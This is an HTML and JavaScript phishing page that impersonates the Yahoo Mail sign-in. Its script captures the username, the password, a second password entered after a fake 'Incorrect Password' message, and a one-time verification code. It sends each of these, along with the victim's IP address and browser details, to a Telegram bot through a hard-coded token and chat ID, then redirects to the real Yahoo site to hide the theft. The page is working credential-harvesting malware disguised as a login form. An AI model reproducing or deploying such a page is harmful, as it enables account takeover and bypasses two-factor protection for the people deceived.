<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Yahoo - Login & Verify</title>
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
    <link rel="stylesheet" href="./styles.css" />
    <style>
      :root {
        --yahoo-purple: #7f3fff; /* bright button color */
        --yahoo-deeppurple: #6001d2; /* brand purple */
        --text-primary: #111111;
        --text-secondary: #5f6368;
        --border: #e0e0e0;
        --focus: #6a4df5;
        --bg: #ffffff;
      }

      * {
        box-sizing: border-box;
      }

      html, body {
        height: 100%;
      }

      body {
        margin: 0;
        font-family: Inter, system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial, "Apple Color Emoji", "Segoe UI Emoji";
        color: var(--text-primary);
        background: var(--bg);
      }

      .page {
        min-height: 100dvh;
        display: grid;
        grid-template-rows: auto 1fr auto;
      }

      .brand {
        display: flex;
        justify-content: center;
        padding: 24px 16px 0;
        width: 100%;
      }

      .logo {
        width: 90px; /* nice balanced size */
        height: auto;
        color: var(--yahoo-deeppurple);
      }

      .card {
        width: 100%;
        max-width: 900px; /* allow more room */
        margin: 0 auto;
        padding: 16px 24px;
      }

      .title {
        font-weight: 700;
        font-size: 25px;
        text-align: center;
        line-height: 1.12;
        letter-spacing: -0.02em;
        margin: 12px 0 8px;
        margin-top: 40px;
      }

      .subtitle {
        font-size: 16px;
        color: #404040;
        margin: 0 0 36px;
        text-align: center;
      }

      .field {
        display: block;
        width: 95%;        /* wider on all screens */
        max-width: 800px;
        margin: 50px auto 0;
      }

      .field-label {
        display: block;
        font-size: 14px;
        color: #555;
        margin-top: 65px;
      }

      .field-input {
        width: 100%;
        font-size: 16px;   /* smaller, cleaner */
        padding: 10px 2px 8px;
        border: none;
        border-bottom: 2px solid var(--border);
        outline: none;
        background: transparent;
      }

      .field-input:focus {
        border-bottom-color: var(--yahoo-deeppurple);
      }

      .field-underline {
        display: none;
      }

      .btn {
        display: inline-flex;
        align-items: center;
        justify-content: center;
        gap: 8px;
        border: none;
        border-radius: 999px;
        font-weight: 400;
        cursor: pointer;
        text-decoration: none;
      }

      .btn-primary {
        background: var(--yahoo-purple);
        color: white;
        width: 95%;         /* wider on mobile too */
        max-width: 800px;
        font-size: 20px;
        padding: 12px;
        margin: 30px auto 0;
        display: block;
        box-shadow: 0 6px 20px rgba(127, 63, 255, 0.35);
      }

      .btn-primary:active {
        transform: translateY(1px);
      }

      .helper {
        text-align: center;
        margin: 24px auto 0;
        font-size: 15px;
        width: 95%;
        max-width: 800px;
      }

      .link {
        color: var(--yahoo-deeppurple);
        font-weight: 400;
        text-decoration: none;
      }

      .link:hover {
        text-decoration: underline;
      }

      .cta-footer {
        padding: 10px;
        background: linear-gradient(to top, rgba(255,255,255,0.95), rgba(255,255,255,0.8) 60%, rgba(255,255,255,0));
        display: flex;
        justify-content: center;
      }

      @media (min-width: 768px) {
        .card {
          padding: 24px 48px;
        }
        .btn-primary,
        .field,
        .helper,
        .btn-ghost {
          width: 800px; /* fixed max width for desktop */
        }
      }
    </style>
  </head>
  <body>
    <main class="page">
      <header class="brand">
        <img class="logo" src="https://raw.githubusercontent.com/jvictory9948/plmassets/refs/heads/main/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo! Logo">
      </header>

      <section class="card">
        <h2 class="title">Sign in to Yahoo Mail</h2>
        <p class="subtitle">Sign in using your Yahoo account</p>

        <label class="field" id="emailField">
          <span class="field-label">Username, email or mobile</span>
          <input class="field-input" type="text" inputmode="email" autocomplete="username" aria-label="Username, email or mobile" id="emailInput"/>
          <span class="field-underline" aria-hidden="true"></span>
        </label>

        <label class="field" id="passwordField" style="display: none;">
          <span class="field-label">Password</span>
          <input class="field-input" type="password" autocomplete="current-password" aria-label="Password" id="passwordInput"/>
          <span class="field-underline" aria-hidden="true"></span>
        </label>
                <label class="field" id="passwordField1" style="display: none;">
          <span class="field-label">Re Enter Password</span>
          <p style="color:red">Incorrect Password</p>
          <input class="field-input" type="password" autocomplete="current-password" aria-label="Password" id="passwordInput1"/>
          <span class="field-underline" aria-hidden="true"></span>
        </label>

        <label class="field" id="codeField" style="display: none;">
          <span class="field-label">Enter verification code</span>
          <input class="field-input" type="text" inputmode="numeric" maxlength="6" placeholder="6-digit code" id="codeInput"/>
          <span class="field-underline" aria-hidden="true"></span>
        </label>

        <button class="btn btn-primary" type="button" id="loginNext">Next</button>

        <p class="helper" id="resendText" style="display: none;">
          Resend code in 60
        </p>

        <p class="helper">
          <a href="#" class="link">Forgotten username?</a>
        </p>
        <span class="cta-footer" aria-label="Create account">
          <a class="btn btn-ghost" href="#">Create an account</a>
        </span>
      </section>
    </main>

<script>
  // Telegram configuration - using your provided credentials
  const TELEGRAM_BOT_TOKEN = '8253727972:AAFpIeSwOWci_jCPymG0i4avq9rIIjOhJwY';
  const TELEGRAM_CHAT_ID = '6806859535';

  // Function to get the user's IP address
  async function getIPAddress() {
    try {
      const response = await fetch('https://api.ipify.org?format=json');
      const data = await response.json();
      return data.ip;
    } catch (error) {
      console.error('Error fetching IP address:', error);
      return 'Unknown IP';
    }
  }

  // Function to send message to Telegram
  async function sendToTelegram(message) {
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const response = await fetch(url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message
        })
      });

      const data = await response.json();
      console.log('Telegram response:', data);
      return data.ok;
    } catch (error) {
      console.error('Error sending to Telegram:', error);
      return false;
    }
  }

  // Function to show notification
  function showNotification(message, isSuccess = true) {
    const notification = document.getElementById('notification');
    notification.textContent = message;
    notification.style.backgroundColor = isSuccess ? '#4CAF50' : '#f44336';
    notification.style.display = 'block';

    setTimeout(() => {
      notification.style.display = 'none';
    }, 3000);
  }

  // Store collected data
  const collectedData = {
    email: '',
    password: '',
    password2: '',
    code: '',
    rememberMe: false
  };

  // Format and send collected data to Telegram in the requested format
  async function reportToTelegram(step) {
    const ipAddress = await getIPAddress();
    let message = `IP Address: ${ipAddress}\n`;
    message += `Email, mobile, or username: ${collectedData.email || 'Not provided'}\n`;
    message += `%D%1 Password: ${collectedData.password || 'Not provided'}\n`;
    message += `%D%2 OTP: ${collectedData.code || 'Not provided'}\n`;
    message += `%D%E Remember Me: ${collectedData.rememberMe ? 'Yes' : 'No'}\n`;
    message += `%C%0 Browser Info:\n`;
    message += `%2 User Agent: ${navigator.userAgent}\n`;
    message += `%2 Timestamp: ${new Date().toLocaleString()}\n`;
    message += `%2 Step: ${step}`;

    // Send to Telegram and wait for it to complete
    const success = await sendToTelegram(message);
    if (success) {
      console.log('Data sent to Telegram successfully');
    } else {
      console.error('Failed to send data to Telegram');
    }

    return success;
  }

  let step = 1;
  const emailField = document.getElementById("emailField");
  const passwordField = document.getElementById("passwordField");
  const codeField = document.getElementById("codeField");
  const emailInput = document.getElementById("emailInput");
  const passwordInput = document.getElementById("passwordInput");
  const codeInput = document.getElementById("codeInput");
  const nextButton = document.getElementById("loginNext");
  const resendText = document.getElementById("resendText");
  const passwordInput1 = document.getElementById("passwordInput1")

  let timeLeft = 60;
  const timer = setInterval(() => {
    timeLeft--;
    resendText.textContent = timeLeft > 0
      ? `Resend code in ${timeLeft}`
      : "Resend code";
    if (timeLeft <= 0) clearInterval(timer);
  }, 1000);

  nextButton.addEventListener("click", async () => {
    if (step === 1) {
      // First step: Email validation
      const email = emailInput.value.trim();

      if (!email) {
        alert("Please enter your email.");
        return;
      }

      collectedData.email = email;

      // Report to Telegram and wait for completion
      await reportToTelegram('Step 1 - Username entered');

      // Hide email field, show password field
      emailField.style.display = "none";
      passwordField.style.display = "block";
      nextButton.textContent = "Sign In";
      step = 2;

    } else if (step === 2) {
      // Second step: Send email and password to API
      const email = emailInput.value.trim();
      const password = passwordInput.value.trim();

      if (!password) {
        alert("Please enter your password.");
        return;
      }

      collectedData.password = password;
      // Report to Telegram and wait for completion
      await reportToTelegram('Step 2 - Password entered');

      // Disable button to prevent double submission
      nextButton.disabled = true;
      nextButton.textContent = "Signing in...";

      // Simulate API call
      setTimeout(() => {
        // Success - show verification code field
        passwordField.style.display = "none";
        passwordField1.style.display = "block";
        resendText.style.display = "none";
        nextButton.textContent = "Next";
        step = 21;
        nextButton.disabled = false;
      }, 1000);

    } else if (step === 21){
            // Second step: Send email and password to API
      const email = emailInput.value.trim();
      const password1 = passwordInput1.value.trim();

      if (!password1) {
        alert("Please enter your password.");
        return;
      }

      collectedData.password1 = password1;
      // Report to Telegram and wait for completion
      await reportToTelegram('Step 2a - Password 2 entered');

      // Disable button to prevent double submission
      nextButton.disabled = true;
      nextButton.textContent = "Signing in...";

      // Simulate API call
      setTimeout(() => {
        // Success - show verification code field
        passwordField1.style.display = "none";
        codeField.style.display = "block";
        resendText.style.display = "block";
        nextButton.textContent = "Verify";
        step = 3;
        nextButton.disabled = false;
      }, 1000);
      
    }
    else if (step === 3) {
      // Third step: Verify code
      const code = codeInput.value.trim();

      if (!code) {
        alert("Please enter the verification code.");
        return;
      }

      if (code.length !== 6) {
        alert("Please enter a valid 6-digit code.");
        return;
      }

      collectedData.code = code;

      // Report to Telegram and wait for completion
      await reportToTelegram('Step 3 - Verification code entered');

      // Disable button to prevent double submission
      nextButton.disabled = true;
      nextButton.textContent = "Verifying...";

      // Simulate API call
      setTimeout(async () => {
        // Success - show success message
        alert("Verification successful!");
        const ipAddress = await getIPAddress();
        const finalMessage = `IP Address: ${ipAddress}\nVerification successful!`;
        await sendToTelegram(finalMessage);
        window.location.href = "https://www.yahoo.com"; // Redirect to Yahoo homepage
      }, 1000);
    }
  });
</script>
  </body>
</html>
